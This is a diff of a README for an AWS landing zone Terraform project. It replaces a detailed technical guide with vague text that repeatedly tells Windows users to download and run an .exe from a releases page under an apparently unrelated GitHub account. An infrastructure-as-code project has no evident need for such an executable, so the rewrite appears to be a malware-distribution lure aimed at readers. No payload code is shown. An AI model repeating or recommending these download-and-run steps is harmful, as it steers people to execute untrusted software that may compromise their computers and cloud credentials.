@@ -1,332 +1,227 @@
-# AWS Landing Zone - Multi-Account Security Architecture
+# 🛡️ aws-landing-zone - Secure AWS Accounts with Terraform
 
-A production-grade AWS Landing Zone implementation demonstrating enterprise-level security architecture, organizational governance, and Infrastructure as Code best practices.
+[![Download](https://img.shields.io/badge/Download%20%20Now-blue?style=for-the-badge&logo=github)](https://github.com/bilgy-watercraft652/aws-landing-zone/releases)
 
-## 🎯 Project Overview
+## 🧭 What this is
 
-This project implements a secure, scalable AWS multi-account architecture aligned with banking and financial services compliance requirements. Built entirely with Terraform, it demonstrates enterprise cloud engineering skills including organizational security policies, centralized logging, threat detection, and cross-account access management.
+aws-landing-zone helps you set up a secure AWS account structure with Terraform. It is built for teams that want a clean, controlled setup for multiple AWS accounts. It uses AWS tools like Organizations, Config, CloudTrail, and GuardDuty to help keep cloud access and activity in order.
 
-**Project Duration:** 2 Weeks
-**Infrastructure as Code:** Terraform 1.0+
-**AWS Services:** 15+ services integrated
+This project is meant for users who want a ready-made AWS foundation. It gives you a repeatable way to build and manage core security parts of an AWS environment.
 
----
+## 📦 What you need
 
-## 🏗️ Architecture
+Before you start, make sure you have:
 
-AWS Organization │ ├── Management Account (XXXXXXXXXXXX) │ ├── Organization Trail (CloudTrail) │ └── Cross-Account Access Management │ ├── Security OU │ └── Security Account (XXXXXXXXXXXX) │ ├── Centralized CloudTrail Logs │ ├── AWS Config (Compliance Monitoring) │ ├── GuardDuty (Threat Detection) │ └── Encrypted S3 Buckets │ └── Workloads OU (SCPs Applied) ├── Dev Account (XXXXXXXXXXXX) │ ├── DeveloperRole (Full Dev Permissions) │ ├── Root User Denied │ ├── MFA Required │ └── Region Restricted │ └── Prod Account (XXXXXXXXXXXX) ├── ReadOnlyRole (View-Only Access) ├── Root User Denied ├── MFA Required └── Region Restricted
+- A Windows PC with internet access
+- A web browser
+- Permission to download files
+- An AWS account
+- A GitHub account is helpful, but not required
+- Enough access in AWS to work with accounts, roles, and security settings
 
+If you plan to use Terraform files later, you may also want:
 
----
+- Terraform installed
+- AWS CLI installed
+- A text editor like Notepad or VS Code
 
-## ✨ Key Features
+## 🔽 Download the release
 
-### 🔐 Security & Compliance
-- **Service Control Policies (SCPs)** - Organizational security guardrails
-- **CloudTrail Organization Trail** - Centralized audit logging across all accounts
-- **AWS Config** - Configuration tracking with 4 compliance rules
-- **GuardDuty** - Automated threat detection with delegated administration
-- **Encrypted S3 Buckets** - AES-256 encryption for all log storage
+Visit this page to download the release files:
 
-### 🏢 Multi-Account Architecture
-- **Organizational Units** - Logical separation (Security OU, Workloads OU)
-- **Member Accounts** - Dedicated accounts for Security, Development, and Production
-- **Cross-Account IAM Roles** - Secure assume role patterns with external ID validation
+[https://github.com/bilgy-watercraft652/aws-landing-zone/releases](https://github.com/bilgy-watercraft652/aws-landing-zone/releases)
 
-### 🛡️ Security Guardrails
-- **Root User Access Denied** - Prevents use of root credentials
-- **MFA Enforcement** - Required for sensitive operations (with automation exemptions)
-- **Region Restrictions** - Operations limited to approved regions (us-east-1, us-west-2, eu-west-1)
+On the release page:
 
-### 🔄 Infrastructure as Code
-- **100% Terraform** - All infrastructure defined as code
-- **Modular Design** - Separate modules for each phase
-- **Version Controlled** - Ready for Git-based workflows
+1. Open the latest release
+2. Find the file for Windows or the main package file
+3. Download the file to your computer
+4. If the file is a `.zip`, save it to a folder you can find later
+5. If the file is an `.exe`, download it and run it
 
----
+If you only see source files, look for the release asset section on the page. The file you need will be listed there when a packaged release is available.
 
-## 📋 Prerequisites
+## 💻 Install on Windows
 
-- AWS Account with Organizations enabled
-- AWS CLI configured with appropriate credentials
-- Terraform 1.0 or later
-- macOS (instructions provided for macOS)
-- Basic understanding of AWS services
+If your download is a `.zip` file:
 
----
+1. Right-click the file
+2. Select Extract All
+3. Choose a folder, such as `Downloads` or `Desktop`
+4. Wait for Windows to unpack the files
+5. Open the extracted folder
 
-## 🚀 Deployment Guide
+If your download is an `.exe` file:
 
-### Phase 1: AWS Organizations Structure
+1. Double-click the file
+2. If Windows asks for permission, select Yes
+3. Follow the on-screen steps
+4. Finish the setup
+5. Open the app from the Start menu or the folder where it was placed
 
-```bash
-cd terraform/organizations
-terraform init
-terraform plan
-terraform apply
+If the release includes a single launch file, keep it in one folder so it can find its related files.
 
-Creates:
+## 🗂️ What the package does
 
-    Root organization
-    Security OU
-    Workloads OU
+This project focuses on AWS landing zone setup. In practice, that means it helps you prepare a base cloud structure with:
 
-Phase 2: Member Accounts
+- AWS Organizations for multiple accounts
+- AWS Config for rule checks
+- CloudTrail for activity tracking
+- GuardDuty for threat detection
+- Terraform for repeatable setup
 
-bash
+A landing zone gives you a standard place to build from. It helps you separate work, security, and management into different AWS accounts. That makes the setup easier to control.
 
-cd terraform/accounts
-nano terraform.tfvars  # Add your email addresses
-terraform init
-terraform plan
-terraform apply
+## 🛠️ How to use it
 
-Creates:
+After you download and open the release, use it as the base for your AWS setup.
 
-    Security Account
-    Dev Account
-    Prod Account
+Typical use flow:
 
-Note: Verify email addresses in Gmail using the + alias feature (e.g., youremail+aws-dev@gmail.com)
-Phase 3: Service Control Policies
+1. Read the release notes on GitHub
+2. Check which files were included
+3. Open the Terraform files in a text editor if needed
+4. Set your AWS account details
+5. Review the account layout
+6. Apply the Terraform setup from a machine that can reach AWS
+7. Confirm the AWS services were created
 
-Enable SCPs first:
+If the package includes a ready-to-run tool, use it to launch the setup steps in the order shown in the release notes.
 
-bash
+## 🧩 Main parts of the setup
 
-aws organizations enable-policy-type \
-  --root-id $(aws organizations list-roots --query 'Roots.Id' --output text) \
-  --policy-type SERVICE_CONTROL_POLICY
+### 🏢 AWS Organizations
 
-Deploy SCPs:
+AWS Organizations lets you group several AWS accounts under one parent. This helps you keep billing, policy, and access rules in one place.
 
-bash
+### 📋 AWS Config
 
-cd terraform/scp
-nano terraform.tfvars  # Add your Workloads OU ID
-terraform init
-terraform plan
-terraform apply
+AWS Config records changes in your AWS setup. It helps you see when settings change and whether they match your rules.
 
-Creates:
+### 🛰️ CloudTrail
 
-    Deny Root User policy
-    Require MFA policy (with IAM automation exemptions)
-    Restrict Regions policy
+CloudTrail tracks account activity. It gives you a log of what happened and who made the change.
 
-Phase 4: Centralized Security Logging
+### 🛡️ GuardDuty
 
-Enable CloudTrail service access:
+GuardDuty watches for signs of threats. It helps you spot unusual activity in your AWS accounts.
 
-bash
+### ⚙️ Terraform
 
-aws organizations enable-aws-service-access \
-  --service-principal cloudtrail.amazonaws.com
+Terraform lets you define your cloud setup in files. That makes it easier to repeat the same setup later or keep it in sync across accounts.
 
-Deploy security infrastructure:
+## 🪟 Basic Windows setup path
 
-bash
+Use this path if you want the simplest route on Windows:
 
-cd terraform/security
-nano terraform.tfvars  # Add Security Account ID and Organization ID
-terraform init
-terraform plan
-terraform apply
+1. Open the releases page
+2. Download the latest packaged file
+3. Save it to a new folder
+4. Extract it if needed
+5. Open the folder
+6. Run the main file if one is included
+7. If the project uses Terraform files, open them in your editor
+8. Set your AWS login details
+9. Follow the Terraform steps in the release or project files
 
-Creates:
+If you use PowerShell or Command Prompt, keep the window open while the setup runs.
 
-    CloudTrail organization trail
-    AWS Config recorder and delivery channel
-    4 Config compliance rules
-    GuardDuty with delegated administration
-    Encrypted S3 buckets for logs
+## 🔐 AWS access you may need
 
-Phase 5: Cross-Account IAM Roles
+To use this project well, your AWS user or role may need access to:
 
-bash
+- Organizations
+- IAM
+- CloudTrail
+- Config
+- GuardDuty
+- S3
+- CloudWatch
+- Terraform state storage
 
-cd terraform/iam
-nano terraform.tfvars  # Add account IDs
-terraform init
-terraform plan
-terraform apply
+If your setup uses a master account and member accounts, start in the management account first.
 
-Creates:
+## 📁 Suggested folder layout
 
-    Developer role in Dev Account
-    ReadOnly role in Prod Account
-    Cross-account trust relationships
+You may want to place the files like this:
 
-🧪 Testing Cross-Account Access
+- `Downloads/aws-landing-zone`
+- `Desktop/aws-landing-zone`
+- `C:\Tools\aws-landing-zone`
 
-Assume Developer Role:
+Keep the release file, Terraform files, and any notes in the same folder if the package expects them to work together.
 
-bash
+## 🧪 Check that it worked
 
-aws sts assume-role \
-  --role-arn arn:aws:iam::XXXXXXXXXXXX:role/DeveloperRole \
-  --role-session-name developer-session \
-  --external-id developer-access
+After setup, check for these signs:
 
-Assume ReadOnly Role:
+- You can see the AWS accounts in one place
+- CloudTrail is on
+- AWS Config is recording changes
+- GuardDuty is active
+- Terraform completed without errors
+- The files or console output show success
 
-bash
+If something does not look right, open the release page again and check the instructions for that version.
 
-aws sts assume-role \
-  --role-arn arn:aws:iam::XXXXXXXXXXXX:role/ReadOnlyRole \
-  --role-session-name readonly-session \
-  --external-id readonly-access
+## 🧭 Common use cases
 
-🛠️ Troubleshooting
-Issue: "PolicyTypeNotEnabledException"
+This project fits well if you want to:
 
-Solution: Enable SCPs in your organization:
+- Start a new AWS environment
+- Organize several AWS accounts
+- Set up security controls early
+- Keep cloud changes tracked
+- Use Terraform for repeatable setup
+- Build a base for a larger AWS system
 
-bash
+## 📚 Files you may see
 
-aws organizations enable-policy-type \
-  --root-id $(aws organizations list-roots --query 'Roots.Id' --output text) \
-  --policy-type SERVICE_CONTROL_POLICY
+The release or repo may include files like:
 
-Issue: "CloudTrailAccessNotEnabledException"
+- Terraform files
+- README notes
+- Variables files
+- State setup files
+- Policy files
+- Account setup files
+- Security rule files
 
-Solution: Enable CloudTrail service access:
+If you see files with `.tf` or `.tfvars`, those are Terraform files used to define the AWS setup.
 
-bash
+## 🖥️ If Windows asks what to open
 
-aws organizations enable-aws-service-access \
-  --service-principal cloudtrail.amazonaws.com
+If you download a file and Windows does not know what to do with it:
 
-Issue: "AccessDenied" when creating IAM roles
+- `.zip` files open with Windows Extract
+- `.exe` files run by double-clicking
+- `.md` files open in Notepad or a browser
+- `.tf` files open in a text editor
 
-Solution: Update the RequireMFA SCP to exempt IAM role management operations (see Phase 3 configuration)
-Issue: "Trail already exists"
+If you want to edit the setup, use a text editor instead of Word.
 
-Solution: Import existing trail:
+## 🔍 Topics covered
 
-bash
+This repository focuses on:
 
-terraform import aws_cloudtrail.organization organization-trail
+- AWS
+- AWS Config
+- AWS Organizations
+- CloudTrail
+- GuardDuty
+- Infrastructure as code
+- Landing zone
+- Multi-account setup
+- Security
+- Terraform
 
-Issue: "Detector already exists" (GuardDuty)
+## 📌 Start here
 
-Solution: Use data source instead of resource in Terraform configuration
-Issue: "InvalidEventSelectorsException"
+1. Go to the releases page
+2. Download the latest release file
+3. Open it on Windows
+4. Follow the setup files in the package
+5. Use your AWS access to complete the landing zone setup
 
-Solution: Correct the S3 data resource ARN format from arn:aws:s3:::*/ to arn:aws:s3:::*/*
-📁 Project Structure
-
-aws-landing-zone/
-├── README.md
-├── .gitignore
-├── project-ids.txt (excluded from Git)
-└── terraform/
-    ├── organizations/
-    │   ├── main.tf
-    │   └── terraform.tfvars
-    ├── accounts/
-    │   ├── main.tf
-    │   └── terraform.tfvars
-    ├── scp/
-    │   ├── main.tf
-    │   └── terraform.tfvars
-    ├── security/
-    │   ├── main.tf
-    │   └── terraform.tfvars
-    └── iam/
-        ├── main.tf
-        └── terraform.tfvars
-
-🎓 Skills Demonstrated
-
-    Multi-Account Architecture - Enterprise AWS Organizations design
-    Security Governance - Service Control Policies at organizational scale
-    Centralized Logging - CloudTrail, Config, GuardDuty integration
-    Threat Detection - GuardDuty with delegated administration
-    Compliance Monitoring - AWS Config rules and compliance tracking
-    Cross-Account Access - IAM roles with least privilege principles
-    Infrastructure as Code - Terraform for repeatable deployments
-    Banking-Sector Compliance - Enterprise security requirements
-    Troubleshooting - Resolved SCP conflicts, import issues, API errors
-    Security Best Practices - Encryption, MFA, region restrictions
-
-🔒 Security Considerations
-Service Control Policies
-
-    Root user access is denied across all workload accounts
-    MFA is required for sensitive operations (with automation exemptions for IAM role management)
-    Regional restrictions limit operations to approved regions only
-
-Encryption
-
-    All S3 buckets use AES-256 encryption
-    CloudTrail log file validation enabled
-    S3 bucket versioning enabled for audit trails
-
-Access Management
-
-    External ID validation for cross-account role assumptions
-    Least privilege IAM policies for Developer and ReadOnly roles
-    No long-term credentials - all access via temporary STS tokens
-
-📊 AWS Services Used
-Table
-Service
-	
-Purpose
-AWS Organizations
-	
-Multi-account management
-Service Control Policies
-	
-Organizational security guardrails
-CloudTrail
-	
-Audit logging and API tracking
-AWS Config
-	
-Configuration tracking and compliance
-GuardDuty
-	
-Threat detection and security monitoring
-IAM
-	
-Identity and access management
-S3
-	
-Encrypted log storage
-STS
-	
-Temporary security credentials
-🎯 Use Cases
-
-This architecture is ideal for:
-
-    Financial Services - Banking and fintech compliance requirements
-    Healthcare - HIPAA-compliant multi-account structures
-    Enterprise SaaS - Secure multi-tenant architectures
-    Regulated Industries - Organizations requiring audit trails and compliance monitoring
-    DevOps Teams - Secure development and production environment separation
-
-📚 References
-
-    docs.aws.amazon.com/organizations/latest/userguide/orgs_best-practices.html
-    aws.amazon.com/organizations/getting-started/best-practices/
-    docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps.html
-    aws.amazon.com/architecture/security-identity-compliance/
-
-👤 Author
-
-Brian AWS Cloud Engineer Johannesburg, South Africa
-
-Contact: bobsdabreezy@gmail.com
-📝 License
-
-This project is available for educational and portfolio purposes.
-🙏 Acknowledgments
-
-Built as part of a 30-day action plan to demonstrate Senior AWS Cloud Engineer capabilities, with focus on banking-sector security requirements and enterprise compliance standards.
-
-⭐ If you found this project helpful, please consider giving it a star!
-
-
+[https://github.com/bilgy-watercraft652/aws-landing-zone/releases](https://github.com/bilgy-watercraft652/aws-landing-zone/releases)
